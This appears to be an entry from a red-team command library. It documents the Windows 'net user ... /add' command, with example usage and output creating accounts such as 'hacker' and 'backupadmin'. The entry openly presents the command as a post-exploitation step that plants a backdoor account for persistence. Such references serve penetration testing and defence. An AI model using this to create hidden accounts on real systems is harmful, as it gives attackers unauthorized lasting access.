---
id: 36cfabad-156e-4047-a7da-906a98119fa2
type: command
executor: cmd
data: net user $_USERNAME $_PASSWORD /add
output: |-
  C:\Windows\system32>net user hacker hacker /add
  The command completed successfully.
created_at: '2019-11-14T00:19:34.662723+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - persistence
  - account-creation
verified: true
validated: true
---

# windows-add-new-user

## Command

```cmd
net user $_USERNAME $_PASSWORD /add
```

## Description

This command creates a new local user account on a Windows system using the built-in net.exe utility. It is used in post-exploitation to establish persistence by adding a backdoor account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | The desired username for the new account (e.g., 'hacker') | Yes |
| $_PASSWORD | The password for the new account (must meet policy requirements) | Yes |
| /add | Flag to add the user (built-in) | Yes |

## Examples

### Basic Usage

```cmd
net user backupadmin P@ssw0rd123 /add
```

### Advanced Usage

For accounts with specific logon restrictions, combine with additional net options, but this basic form suffices for standard creation.

## Expected Output

```
C:\Windows\system32>net user hacker hacker /add
The command completed successfully.
```

If the command fails, it may indicate insufficient privileges or password policy violations.

## Related

- [[procedures/Add-Local-Administrator-to-Windows]]
